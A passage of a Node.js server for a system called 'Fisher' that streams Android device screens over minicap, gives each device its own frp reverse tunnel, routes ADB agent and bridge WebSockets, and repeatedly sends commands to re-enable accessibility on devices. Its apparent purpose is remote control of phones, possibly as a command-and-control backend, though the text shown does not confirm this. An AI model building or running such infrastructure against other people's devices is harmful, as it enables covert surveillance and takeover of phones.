    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: 'proxyName required' }));
    return;
  }
  const r = await closeFrpsProxy(proxyName, proxyType);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ ok: true, frps: r }));
  return;
}

// ★ /internal/minicap-stream — 使用 StreamHub + DeviceUpstream (2026-08-05)
// 特性：连接池/帧缓冲/重连/扇出/stall 看门狗，断流恢复无黑屏
if (req.url && req.url.startsWith('/internal/minicap-stream')) {
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
  const u = new URL(req.url, `http://${req.headers.host}`);
  const deviceId = u.searchParams.get('deviceId');
  if (!deviceId) {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: 'deviceId required' }));
    return;
  }
  // 先验证设备存在（避免无意义订阅）
  try {
    const [rows] = await dbPool.execute(
      'SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1',
      [deviceId]
    );
    if (!rows[0] || !rows[0].remote_port || rows[0].remote_port <= 0) {
      res.writeHead(502, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'No tunnel port for device' }));
      return;
    }
  } catch (e) {
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: e.message }));
    return;
  }

  // 加 multipart 响应头
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'X-Accel-Buffering': 'no',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });
  if (res.socket && res.socket.setKeepAlive) {
    res.socket.setKeepAlive(true, 30000);
  }

  // 包装 res 为 consumer（具备 write/drain/close 事件）
  res._skipFrames = false;
  streamHub.subscribe(deviceId, res);
  console.log(`[minicap-stream] subscribe ${deviceId}`);
  return;
}

// ★ /internal/minicap/stats — 监控指标（设备状态/帧计数/重连次数）
if (req.url && req.url.startsWith('/internal/minicap/stats')) {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(streamHub.getMetrics(), null, 2));
  return;
}


// 19901 跳板超时释放：每分钟检查，释放超过 5 分钟无活动的设备
// ★ Stability: in-flight guard — 如果上一次 tick 还在跑则跳过本次，避免堆积
//
// ★ 2026-09-03 死锁修复：改为"先 SELECT 再按主键逐行 UPDATE + 死锁重试"
// ★ 2026-09-03 LIMIT/OFFSET 修复：mysql2 execute() 不接受 LIMIT ? 整数占位符（参数绑定错误），
//   所以 PAGE_SIZE / offset 直接用数字字面量拼 SQL（来自本地代码，无注入风险）。
let springboardTimeoutRunning = false;
setInterval(async () => {
  if (springboardTimeoutRunning) return;
  springboardTimeoutRunning = true;
  try {
    const fiveMinutesAgo = Math.floor(Date.now() / 1000) - 5 * 60;
    const SB_PAGE_SIZE = 50;
    let sbOffset = 0;
    let hasMore = true;
    let totalReleased = 0;
    let totalScanned = 0;

    while (hasMore) {
      let rows;
      try {
        // ★ 分页 LIMIT/OFFSET 用数字字面量（避免 mysql2 预编译参数 bug）
        [rows] = await dbPool.execute(
          `SELECT device_id FROM fisher_devices
           WHERE remote_port = 19901 AND last_seen < ? AND last_seen > 0
           ORDER BY device_id ASC
           LIMIT ${SB_PAGE_SIZE|0} OFFSET ${sbOffset|0}`,
          [fiveMinutesAgo]
        );
      } catch (e) {
        console.warn(`[SpringboardTimeout] SELECT page aborted: ${e.message}`);
        break;
      }
      if (!rows || rows.length === 0) { hasMore = false; break; }
      totalScanned += rows.length;
      sbOffset += rows.length;
      if (rows.length < SB_PAGE_SIZE) hasMore = false;

      for (const row of rows) {
        const did = row.device_id;
        if (!did) continue;
        try {
          const [upd] = await dbWithRetry(
            () => dbPool.execute(
              `UPDATE fisher_devices SET remote_port = 0, tunnel_deployed = 0
               WHERE device_id = ? AND remote_port = 19901 AND last_seen < ? AND last_seen > 0`,
              [did, fiveMinutesAgo]
            ),
            { label: `SpringboardTimeout:${String(did).substring(0, 8)}`, maxRetries: 3 }
          );
          if (upd && upd.affectedRows > 0) totalReleased++;
          await new Promise(r => setTimeout(r, 3));
        } catch (e) {
          console.warn(`[SpringboardTimeout] skip ${String(did).substring(0, 12)}...: ${e.message}`);
        }
      }
    }

    if (totalReleased > 0) {
      console.log(`[SpringboardTimeout] Released 19901 from ${totalReleased}/${totalScanned} inactive device(s) (>5 min)`);
    }
  } catch (e) {
    console.warn(`[SpringboardTimeout] top-level warn: ${e.message}`);
  } finally {
    springboardTimeoutRunning = false;
  }
}, 60000); // 每分钟


// ★ 假在线纠偏（2026-08-05）：keepAlive 清理死连接时已调 ws.terminate() 触发现有 close handler，
//   但仍有两种情况可能产生“假在线”：
//   1. 半开 TCP 连接（设备断网但未发 FIN）readyState 仍为 1 — keepAlive 不探测
//   2. close handler 中的 DB UPDATE 异常失败 — 状态不一致
//   兜底：每 60s 扫描“声称在线但 last_seen > 3 分钟”的设备，强制置为离线。
//   活设备的 last_seen 由 device.js / bridge.js 每 30s 心跳刷新 — 3 分钟不心跳必为真死。
// 注意：last_seen 写节流由 src/services/writeThrottle.js 统一提供（跨 device/bridge/index 共享）

let fakeOnlineGuardRunning = false;
setInterval(async () => {
  if (fakeOnlineGuardRunning) return;
  fakeOnlineGuardRunning = true;
  try {
    // =====================================
    // Phase 1：内存校验（零 DB 锁，零冲突）
    // =====================================
    // connections 里有活跃 WS 的设备 → DB 必定是在线的，绝不处理
    // connections 里没有 的设备 + 不在 grace period 内 → 才可能需要 Phase 2 轻量查询
    const aliveDeviceIds = new Set();
    for (const did of connections.devices.keys()) aliveDeviceIds.add(did);
    for (const did of connections.bridges.keys()) aliveDeviceIds.add(did);
    for (const did of connections.agents.keys())  aliveDeviceIds.add(did);

    // 也考虑 keepAlive 的 grace period（刚断开但在 30 分钟重连窗口内的不踢）
    const { isInGracePeriod } = require('./services/keepAlive');
    for (const did of aliveDeviceIds) {
      // 顺便给已知活跃设备做一个"节流内存标记"：心跳写入只在超过 10s 时允许（在心跳 handler 中实际生效）
      // 这里不做任何 DB 操作，避免争锁
    }

    const fifteenMinutesAgo = Math.floor(Date.now() / 1000) - 15 * 60;

    // =====================================
    // Phase 2：非常轻量的 DB 查询（分页 + 小批量，避免大结果集 + 不排序）
    // 只查 "DB 声称在线 + 内存里不存活 + 不在 grace period" 的设备
    // 关键：不 SELECT ... FOR UPDATE，不加任何锁，只做快照读
    // =====================================
    // 注意：即便这里的 SELECT 仍然要扫表，也不会持有行锁；
    //       但如果表非常大，可能需要 `idx_connected_lastseen (is_connected, last_seen)` 复合索引来加速定位。
    //       可以让用户在 phpMyAdmin 中执行：
    //         ALTER TABLE fisher_devices ADD INDEX idx_conn_lastseen (is_connected, last_seen);
    //         ALTER TABLE fisher_devices ADD INDEX idx_device_id (device_id);  -- 如果 device_id 非主键需加唯一索引
    let offset = 0;
    const PAGE_SIZE = 50;       // 小批量分页，避免长时间占连接
    let totalCorrected = 0;
    let totalScannedDB = 0;
    let hasMore = true;

    while (hasMore) {
      let rows;
      try {
        // ★ LIMIT / OFFSET 直接拼接数字字面量（来自本地代码，完全无注入风险）
        //   原因：mysql2 execute() 的预编译参数不接受 int 绑定在 LIMIT/OFFSET 位置
        //   错误信息：Incorrect arguments to mysqld_stmt_execute
        const safeLimit = Math.max(1, PAGE_SIZE | 0);
        const safeOffset = Math.max(0, offset | 0);
        [rows] = await dbWithRetry(
          () => dbPool.execute(
            `SELECT device_id FROM fisher_devices
             WHERE is_connected = 1 AND last_seen > 0 AND last_seen < ?
             LIMIT ${safeLimit} OFFSET ${safeOffset}`,
            [fifteenMinutesAgo]
          ),
          { label: `FakeOnlineGuard:SELECT:pg${safeOffset/safeLimit|0}`, maxRetries: 2 }
        );
      } catch (e) {
        // SELECT 失败就停止本轮，不再继续（不再 UPDATE 任何东西，避免冲突）
        console.warn(`[FakeOnlineGuard] SELECT page aborted: ${e.message}`);
        break;
      }
      if (!rows || rows.length === 0) { hasMore = false; break; }
      totalScannedDB += rows.length;
      offset += rows.length;
      if (rows.length < PAGE_SIZE) hasMore = false;

      for (const row of rows) {
        const did = row.device_id;
        if (!did) continue;
        // 内存过滤：WS 活着的、grace period 内的 → 跳过 DB UPDATE，绝不去争锁
        if (aliveDeviceIds.has(did)) continue;
        if (isInGracePeriod(did)) continue;

        // 到达这里：内存无连接 + 不在 grace + DB 显示在线且 last_seen>15min → 真正需要下线
        try {
          const [upd] = await dbWithRetry(
            () => dbPool.execute(
              `UPDATE fisher_devices SET is_connected = 0
               WHERE device_id = ? AND is_connected = 1 AND last_seen > 0 AND last_seen < ?`,
              [did, fifteenMinutesAgo]
            ),
            { label: `FakeOnlineGuard:UPD:${String(did).substring(0, 8)}`, maxRetries: 3, delayMs: 120 }
          );
          if (upd && upd.affectedRows > 0) totalCorrected++;
          // 每次 UPDATE 之后让 5ms，给并发心跳让出窗口（避免连续 hammer 同一表）
          await new Promise(r => setTimeout(r, 5));
        } catch (e) {
          // 这里已经是 dbWithRetry 重试完都失败的 → 记 warn，不打 error（不污染日志）
          console.warn(`[FakeOnlineGuard] skip (3 retries exhausted) ${String(did).substring(0, 12)}...: ${e.message}`);
        }
      }
    }

    if (totalCorrected > 0) {
      console.log(`[FakeOnlineGuard] Corrected ${totalCorrected} fake-online (scannedDB=${totalScannedDB}, aliveInMem=${aliveDeviceIds.size})`);
      try {
        const { broadcastToAdmins } = getHandler('./handlers/admin');
        broadcastToAdmins(connections, { type: 'device_update' });
      } catch (e) { /* ignore */ }
    }
  } catch (e) {
    // 顶层级异常才打 warn（不是 error）—— 死锁重试在内部已降级
    console.warn(`[FakeOnlineGuard] top-level warn: ${e.message}`);
  } finally {
    fakeOnlineGuardRunning = false;
  }
}, 120000); // ★ 2026-09-03：60s → 120s（兜底不着急，降低 50% 扫 DB 频率）


    // /api/ 请求代理到 PHP 后端（80端口）— 兼容 APK 直接发 HTTP 请求到 8889 端口
  if (req.url && req.url.startsWith('/api/')) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const proxyReq = require('http').request({
        hostname: '127.0.0.1',
        port: 80,
        path: req.url,
        method: req.method,
        timeout: 5000, // ★ Stability: 防止 PHP 后端 hang 导致客户端 socket 永远挂起
        headers: { ...req.headers, host: config.frps.addr },
      }, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);
      });
      proxyReq.on('error', () => {
        try {
          if (!res.headersSent) {
            res.writeHead(502, { 'Content-Type': 'application/json' });
            res.end('{"success":false,"message":"proxy error"}');
          } else {
            res.end();
          }
        } catch {}
      });
      // ★ Stability: 超时处理 — 销毁请求并返回 504
      proxyReq.on('timeout', () => {
        try {
          proxyReq.destroy();
          if (!res.headersSent) {
            res.writeHead(504, { 'Content-Type': 'application/json' });
            res.end('{"success":false,"message":"upstream timeout"}');
          } else {
            res.end();
          }
        } catch {}
      });
      if (body) proxyReq.write(body);
      proxyReq.end();
    });
    return;
  }

  res.writeHead(404);
  res.end();
});

// WebSocket server
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
  const { pathname, query } = url.parse(req.url, true);
  // ★ 2026-08-07：优先从 Nginx 反代传递的 X-Real-IP / X-Forwarded-For 获取真实 IP
  const realIp = req.headers['x-real-ip']
    || (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
    || (req.socket.remoteAddress || '').replace('::ffff:', '');
  console.log(`[WS] New connection: path=${pathname} query=${JSON.stringify(query)} ip=${realIp}`);
  // 将真实 IP 挂到 req 上，供后续 handler 使用
  req._realIp = realIp;

  const { attachFreeWebSocket } = getHandler('./compat/freeSocketIoCompat');
  const { handleDevice } = getHandler('./handlers/device');
  if (attachFreeWebSocket(ws, req, connections, handleDevice)) return;

  // 路由分发 — 通过 getHandler() 动态获取最新模块引用
  if (pathname === '/ws/panel' || pathname === '/ws/admin') {
    // 管理端 - 需要 token 验证
    const token = query.token || '';
    const user = verifyToken(token);
    if (!user) {
      ws.close(4001, 'Unauthorized');
      return;
    }
    // 查数据库检查禁用/过期/账号多开状态。
    withTimeout(
      loadCurrentActor(dbPool, user),
      PANEL_AUTH_DB_TIMEOUT_MS,
      'WS account status query'
    )
      .then(actor => {
        if (ws.readyState !== 1) return;
        if (!actor) {
          ws.close(4003, 'Account disabled or session replaced');
          return;
        }
        const { handleAdmin } = getHandler('./handlers/admin');
        handleAdmin(ws, actor, connections);
      })
      .catch(err => {
        console.error('[WS] Auth DB check error:', err.message);
        // 权限数据库不可用时必须 fail closed，不能使用 JWT 中可能过期的角色继续连接。
        if (ws.readyState === 1) ws.close(1011, 'Authorization unavailable');
      });
    return; // 异步处理，提前 return 避免后续路由匹配
  } else if (pathname === '/ws/device' || pathname === '/ws/session') {
    // APK 设备端（/ws/session 是旧 Python 后端的路径）
    const sessionId = query.sessionId || query.deviceId || '';
    if (!sessionId) {
      ws.close(4002, 'Missing sessionId');
      return;
    }
    handleDevice(ws, sessionId, connections);
  } else if (pathname === '/ws/bridge') {
    // local-service bridge
    const deviceId = query.deviceId || '';
    if (!deviceId) {
      ws.close(4003, 'Missing deviceId');
      return;
    }
    const { handleBridge } = getHandler('./handlers/bridge');
    handleBridge(ws, deviceId, connections);
  } else if (pathname && pathname.startsWith('/ws/agent/')) {
    // ADB Agent
    const deviceId = pathname.split('/ws/agent/')[1] || '';
    if (!deviceId) {
      ws.close(4004, 'Missing deviceId');
      return;
    }
    const { handleAgent } = getHandler('./handlers/agent');
    handleAgent(ws, deviceId, connections);
  } else {
    ws.close(4000, 'Unknown path');
  }
});

// ★ TCP keepalive：防止 NAT/防火墙切断空闲连接
server.on('connection', (socket) => {
  socket.setKeepAlive(true, 30000); // 30秒 TCP keepalive probe
  socket.setNoDelay(true);          // 禁用 Nagle 算法（低延迟）
  socket.setTimeout(0);             // 禁用超时（永不超时）
});

// 启动服务
server.listen(config.port, () => {
  console.log(`[WS] Fisher WebSocket server listening on port ${config.port}`);
  console.log(`[WS] Paths: /w?d=:id, /ws/panel, /ws/device, /ws/bridge, /ws/agent/:id`);
  console.log(`[WS] Hot-reload endpoint: POST /internal/reload`);
  console.log(`[WS] TCP keepalive: enabled (30s), NoDelay: on`);
});

// 启动命令轮询器
const { startCommandPoller } = require('./services/commandPoller');
startCommandPoller(connections);

// 启动心跳检测
const { startKeepAlive } = require('./services/keepAlive');
startKeepAlive(connections);

// ★ 2026-08-07：自动重连 + 退避机制
// 对同一设备最多尝试 5 次 enableAccessibility，之后停止（避免无限循环重启无障碍）
// 设备 WS 重连成功后自动重置计数器
const _reconnectAttempts = new Map(); // deviceId -> { count, lastSent }
const MAX_RECONNECT_ATTEMPTS = 5;

setInterval(() => {
  for (const [deviceId, bridgeConn] of connections.bridges.entries()) {
    if (!connections.devices.has(deviceId)) {
      const info = _reconnectAttempts.get(deviceId) || { count: 0, lastSent: 0 };
      if (info.count >= MAX_RECONNECT_ATTEMPTS) continue; // 超过上限，停止重试
      try {
        if (bridgeConn.ws && bridgeConn.ws.readyState === 1) {
          bridgeConn.ws.send(JSON.stringify({ command: 'enableAccessibility' }));
          info.count++;
          info.lastSent = Date.now();
          _reconnectAttempts.set(deviceId, info);
          console.log(`[AutoReconnect] Sent enableAccessibility to ${deviceId} via bridge (attempt ${info.count}/${MAX_RECONNECT_ATTEMPTS})`);
        }
      } catch (e) {
        console.error(`[AutoReconnect] Error sending to ${deviceId}: ${e.message}`);
      }
    } else {
      // 设备 WS 已恢复 → 重置退避计数器
      if (_reconnectAttempts.has(deviceId)) {
        _reconnectAttempts.delete(deviceId);
      }
    }
  }
}, 60000); // 每 60 秒检查一次
const { startAutoProtectLoop } = require('./services/autoProtect');
startAutoProtectLoop(connections);

// 启动 APK 构建任务轮询
const { startPoller: startApkPoller } = require('./services/apkBuilder');
startApkPoller();

// frps 配置（用于查询 Dashboard API）— 全部从 .env 读取
const FRPS_DASHBOARD = {
  host: process.env.FRPS_DASHBOARD_HOST || '127.0.0.1',
  port: parseInt(process.env.FRPS_DASHBOARD_PORT || '7500', 10),
  user: process.env.FRPS_DASHBOARD_USER || 'admin',
  password: process.env.FRPS_DASHBOARD_PASSWORD || ''
};
if (!FRPS_DASHBOARD.password) console.warn('[FRPS_DASHBOARD] FRPS_DASHBOARD_PASSWORD 未设置，Dashboard API 将无法认证');

// 查询 frps Dashboard API 获取实时 proxy 列表
function fetchFrpsProxies() {
  return new Promise((resolve) => {
    const auth = Buffer.from(`${FRPS_DASHBOARD.user}:${FRPS_DASHBOARD.password}`).toString('base64');
    const fetchOne = (type) => new Promise(r => {
      const req = http.request({
        hostname: FRPS_DASHBOARD.host, port: FRPS_DASHBOARD.port,
        path: `/api/proxy/${type}`, method: 'GET', timeout: 5000,
        headers: { 'Authorization': `Basic ${auth}` }
      }, res => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => { try { r(JSON.parse(d)); } catch { r({ proxies: [] }); } });
      });
      req.on('error', () => r({ proxies: [] }));
      req.on('timeout', () => { req.destroy(); r({ proxies: [] }); });
      req.end();
    });
    Promise.all([fetchOne('tcp'), fetchOne('http')]).then(([tcp, http]) => {
      resolve({ ok: true, data: { tcp: tcp.proxies || [], http: http.proxies || [] } });
    }).catch(e => resolve({ ok: false, error: e.message }));
  });
}

// 检测本地端口是否可达
function checkLocalPort(port, timeout = 2000) {
  return new Promise((resolve) => {
    const req = http.get({ hostname: '127.0.0.1', port, path: '/health', timeout }, (r) => {
      resolve(r.statusCode >= 200 && r.statusCode < 500);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => { req.destroy(); resolve(false); });
  });
}

// 隧道状态监控 API
async function getTunnelMonitorData() {
  // 1. 从 DB 查询所有设备端口分配
  const [devices] = await dbPool.execute(
    `SELECT device_id, remote_port, tunnel_deployed, last_seen, accessibility_alive, owner_username
     FROM fisher_devices WHERE remote_port > 0 OR tunnel_deployed = 1 ORDER BY remote_port ASC`
  );

  // 2. 查询 frps Dashboard
  const frpsResult = await fetchFrpsProxies();
  const frpsProxies = frpsResult.ok ? [...(frpsResult.data?.tcp || []), ...(frpsResult.data?.http || [])] : [];

  // 3. 检测 19901 跳板端口状态
  const springboardAlive = await checkLocalPort(19901);

  // 4. 组合数据：每个设备加上 frps proxy 信息
  const now = Math.floor(Date.now() / 1000);
  const ports = devices.map(d => {
    const frpsProxy = frpsProxies.find(p => p.name === (d.remote_port === 19901 ? '_local' : `tunnel_${d.device_id.substring(0, 8)}`));
    const lastSeen = d.last_seen || 0;
    const minutesSinceLastSeen = lastSeen > 0 ? Math.floor((now - lastSeen) / 60) : null;
    const isSpringboard = d.remote_port === 19901;
    return {
      port: d.remote_port,
      deviceId: d.device_id,
      tunnelDeployed: !!d.tunnel_deployed,
      lastSeen,
      minutesSinceLastSeen,
      accessibilityAlive: !!d.accessibility_alive,
      owner: d.owner_username,
      isSpringboard,
      frpsProxy: frpsProxy ? {
        name: frpsProxy.name,
        status: frpsProxy.status,
        clientVersion: frpsProxy.client_version,
        todayTrafficIn: frpsProxy.today_traffic_in,
        todayTrafficOut: frpsProxy.today_traffic_out,
        curConns: frpsProxy.cur_conns
      } : null,
      willExpireSoon: isSpringboard && lastSeen > 0 && (now - lastSeen) > 10 * 60
    };
  });

  // 4.5 检测未知 frpc 客户端：frps 上注册但 DB 没有对应设备的 proxy
  // 例如 _local (19901) 被某台 DB 中没有的设备占用
  const unknownProxies = frpsProxies.filter(p => {
    if (p.name === "_local") return false;
    // ★ 过滤掉已释放的端口黑名单（按端口号）
    const pPort = p.conf ? p.conf.remotePort : null;
    if (pPort && _releasedPorts.has(pPort)) return false;
    // ★ 过滤掉已释放的 proxyName 黑名单（野 proxy，无 conf）
    if (_releasedProxyNames.has(p.name)) return false;
    return !ports.find(d => d.frpsProxy && d.frpsProxy.name === p.name);
  }).map(p => ({
    name: p.name,
    remotePort: p.conf ? p.conf.remotePort : null,
    status: p.status,
    clientVersion: p.client_version,
    todayTrafficIn: p.today_traffic_in,
    todayTrafficOut: p.today_traffic_out,
    curConns: p.cur_conns
  }))

  // 5. 统计
  const usedPorts = ports.length;
  const totalPorts = 29999 - 19902 + 1; // 30098
  const springboardOccupant = ports.find(p => p.isSpringboard);

  return {
    timestamp: now,
    frpsOnline: frpsResult.ok,
    frpsError: frpsResult.error || null,
    springboard: {
      port: 19901,
      alive: springboardAlive,
      occupied: !!springboardOccupant,
      occupiedBy: springboardOccupant || null
    },
    summary: {
      totalPorts,
      usedPorts,
      freePorts: totalPorts - usedPorts,
      springboardFree: !springboardOccupant,
      frpsProxyCount: frpsProxies.length,
      unknownProxyCount: unknownProxies.length
    },
    unknownProxies,
    ports
  };
}

// 端口回收：每小时释放超过7天未上线设备的 remote_port（独立端口）
// ★ Stability: in-flight guard — 如果上一次 tick 还在跑则跳过本次，避免堆积
let portRecycleRunning = false;
setInterval(async () => {
  if (portRecycleRunning) return;
  portRecycleRunning = true;
  try {
    const sevenDaysAgo = Math.floor(Date.now() / 1000) - 7 * 24 * 3600;
    const [result] = await dbPool.execute(
      'UPDATE fisher_devices SET remote_port = 0, tunnel_deployed = 0 WHERE remote_port > 19901 AND last_seen < ? AND last_seen > 0',
      [sevenDaysAgo]
    );
    if (result.affectedRows > 0) {
      console.log(`[PortRecycle] Released ${result.affectedRows} ports from inactive devices (>7 days)`);
    }
  } catch (e) {
    console.error(`[PortRecycle] Error: ${e.message}`);
  } finally {
    portRecycleRunning = false;
  }
}, 3600000); // 每小时

// Graceful shutdown — 给设备发 1012 (Service Restart) close 帧后退出
function gracefulShutdown(opts) {
  const waitMs = (opts && opts.waitMs) || 2000;
  const skipExit = opts && opts.skipExit === true;
  console.log('[WS] Graceful shutdown: notifying all clients...');
  
  // 给所有设备连接发送 1012 close（Service Restart）
  for (const [id, conn] of connections.devices) {
    try { conn.ws.close(1012, 'Service Restart'); } catch {}
  }
  // 给所有 bridge 连接发送 1012 close
  for (const [id, conn] of connections.bridges) {
    try { conn.ws.close(1012, 'Service Restart'); } catch {}
  }
  // 给所有 agent 连接发送 1012 close
  for (const [id, conn] of connections.agents) {
    try { conn.ws.close(1012, 'Service Restart'); } catch {}
  }
  // 给所有管理端发送 1012 close
  for (const [id, conn] of connections.admins) {
    try { conn.ws.close(1012, 'Service Restart'); } catch {}
  }

  if (skipExit) {
    // 热重载场景：等 close 帧发完，但不要退出进程
    setTimeout(() => {
      console.log('[WS] Reload notify complete (clients will reconnect)');
    }, waitMs);
    return;
  }
  
  // 等待 close 帧发送完毕，然后退出
  setTimeout(() => {
    console.log('[WS] Shutdown complete.');
    server.close();
    process.exit(0);
  }, waitMs);
}

// 信号处理（Linux: SIGTERM/SIGINT, Windows: SIGINT + Ctrl+C）
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

module.exports = { connections };
